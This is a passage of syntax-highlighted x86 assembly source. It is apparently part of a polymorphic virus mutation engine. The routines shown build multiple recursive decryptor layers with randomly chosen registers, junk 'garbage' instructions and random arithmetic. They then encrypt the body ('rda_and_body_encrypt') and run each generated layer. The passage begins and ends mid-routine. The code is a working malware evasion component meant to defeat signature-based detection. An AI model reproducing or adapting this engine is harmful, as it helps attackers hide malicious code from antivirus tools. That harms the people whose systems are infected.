        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_layer_nr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">poly_generate_layer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">end_most_internal_layer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_and_body_encrypt</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; back to lower layer activation</span><span class="sc0">

</span><span class="sc5">poly_generate_layer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">; stack space needed</span><span class="sc0">
                            </span><span class="sc1">; as temp storage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_di_pointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_init_stage1</span><span class="sc0">        </span><span class="sc1">; init all regs to some</span><span class="sc0">
                            </span><span class="sc1">; value and put quite</span><span class="sc0">
                            </span><span class="sc1">; some garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">         </span><span class="sc1">; how many math ops</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; on memory will be</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; created</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">               </span><span class="sc1">; get initialization</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">        </span><span class="sc1">; type</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tipo_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; 1/2 prob</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">  </span><span class="sc5">dontmodifydirection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">dontmodifydirection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_0_or_1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">select_the_pointer_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">possible_pointers</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ok_pointer_sel_d</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; bp</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">select_the_pointer_reg</span><span class="sc0">

</span><span class="sc5">ok_pointer_sel_d</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">resel_cnt_regg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">resel_cnt_regg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; no stack pointer</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">resel_cnt_regg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; using ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">grb_rest_notneeded</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">restrict_grb_ax_is_used</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">grb_rest_notneeded</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">register_assign_init</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">fill_stack_for_genmath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">        </span><span class="sc1">; fill on the stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; with random vals</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; for next subrout</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; use</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fill_stack_for_genmath</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">create_or_just_read</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_used_table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_math_on_mem_ops</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; can do everything</span><span class="sc0">
                            </span><span class="sc1">; xcept pointer reg</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; bx?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">lower_can_use_also_bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">             </span><span class="sc1">; can use all lower</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; xcept bh/bl</span><span class="sc0">

</span><span class="sc5">lower_can_use_also_bx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">dec_loop_internal_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">    </span><span class="sc1">; select a register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">check_regz_when_by</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; no sp</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">dec_loop_internal_garbage</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; no pointer</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">dec_loop_internal_garbage</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; no counter</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">dec_loop_internal_garbage</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">dec_loop_int_grb_ok</span><span class="sc0">

</span><span class="sc5">check_regz_when_by</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">; is byte size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; no counter</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">dec_loop_internal_garbage</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; if not bx then ok</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">dec_loop_int_grb_ok</span><span class="sc0">        </span><span class="sc1">; anyway other just</span><span class="sc0">
                               </span><span class="sc1">; 16bit access</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; no pointer</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">dec_loop_internal_garbage</span><span class="sc0">

</span><span class="sc5">dec_loop_int_grb_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_instr_with_compat</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_generator</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dec_loop_internal_garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exitloop_condition_gen</span><span class="sc0">      </span><span class="sc1">; put the check for</span><span class="sc0">
                            </span><span class="sc1">; decryptor end and</span><span class="sc0">
                            </span><span class="sc1">; jump back</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_end_pos</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; put a ret opcode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">            </span><span class="sc1">; just at the decryptor</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; ends</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_di_pointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tipo_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_check_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_begin_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_end_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_actual_layer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_poly</span><span class="sc0">           </span><span class="sc1">; recursive layer gen</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_end_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_begin_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_check_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tipo_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_di_pointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pnt_to_end_after_rda</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_end_after_rda_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_pnt_addr_vals</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_di_pointer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; execute layer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; copy everything one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; byte lower so we</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">; delete the ret</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pnt_to_end_after_rda</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
